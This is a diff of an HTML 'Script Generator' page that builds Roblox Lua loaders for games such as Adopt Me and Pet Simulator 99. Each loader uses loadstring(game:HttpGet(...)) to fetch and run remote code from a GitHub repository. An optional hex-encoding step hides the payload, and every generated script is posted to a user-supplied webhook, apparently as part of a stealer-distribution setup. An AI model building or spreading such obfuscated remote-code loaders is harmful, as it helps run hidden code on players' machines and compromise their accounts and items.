@@ -4,15 +4,75 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Script Generator</title>
     <style>
-        body{background:linear-gradient(45deg,#0f0c29,#302b63,#24243e);color:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;margin:0;}
-        h1{font-size:3rem;}
-        .container{display:flex;flex-direction:column;gap:15px;margin-top:20px;text-align:center;}
-        input,select,button{padding:10px;border-radius:8px;border:none;background-color:#333;color:white;font-size:1rem;width:250px;}
-        button{background:#ff0080;cursor:pointer;transition:0.3s;}
-        button:hover{background:#ff0055;transform:scale(1.1);}
-        #generated-script{display:none;background:rgba(0,0,0,0.7);padding:15px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.7);text-align:center;margin-top:20px;max-width:80%;width:100%;}
-        textarea{width:100%;height:100px;background:#222;color:white;border:none;padding:10px;border-radius:5px;font-size:1rem;resize:none;}
-        label { font-size: 1rem; margin-top: 10px; }
+        body {
+            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input, select, button {
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 1rem;
+            width: 250px;
+        }
+        button {
+            background: #ff0080;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff0055;
+            transform: scale(1.1);
+        }
+        #generated-script {
+            display: none;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            margin-top: 20px;
+            max-width: 80%;
+            width: 100%;
+        }
+        textarea {
+            width: 100%;
+            height: 100px;
+            background: #222;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 1rem;
+            resize: none;
+        }
+        label {
+            font-size: 1rem;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -30,18 +90,20 @@
         <label><input type="checkbox" id="obfuscate-option"> Enable Obfuscation</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
-    <div id="generated-script">
+    <div id="generated-script" class="container">
         <h2>Your Script</h2>
         <textarea id="script-output" readonly></textarea>
         <button onclick="copyScript()">Copy All</button>
     </div>
     <script>
-        let loadstrings={"Blox Fruits":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()","Murder Mystery 2":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()","Adopt Me":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()","Pet Simulator 99":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()","Pls Donate":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()};function textToHex(str) {
-        let hex = '';
-        for (let i = 0; i < str.length; i++) {
-            hex += str.charCodeAt(i).toString(16).padStart(2, '0');
-        }
-        return hex;
+        let loadstrings = {
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
+            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
+        };function textToHex(str) {
+        return str.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
     }
 
     function generateScript() {
@@ -65,7 +127,17 @@ if (obfuscate) {
 
 local decoded = "" for i=1, #hex-1, 2 do decoded = decoded .. string.char(tonumber(hex:sub(i, i+1), 16)) end loadstring(decoded)()`; }
 
-sendToWebhook(webhook, script);
+document.getElementById('script-output').value = script;
+        document.getElementById('generated-script').style.display = 'block';
+        document.getElementById('login-container').style.display = 'none';
+        sendToWebhook(webhook, script);
+    }
+
+    function copyScript() {
+        let scriptText = document.getElementById('script-output');
+        scriptText.select();
+        document.execCommand("copy");
+        alert("Script copied to clipboard!");
     }
 
     function sendToWebhook(webhook, scriptContent) {
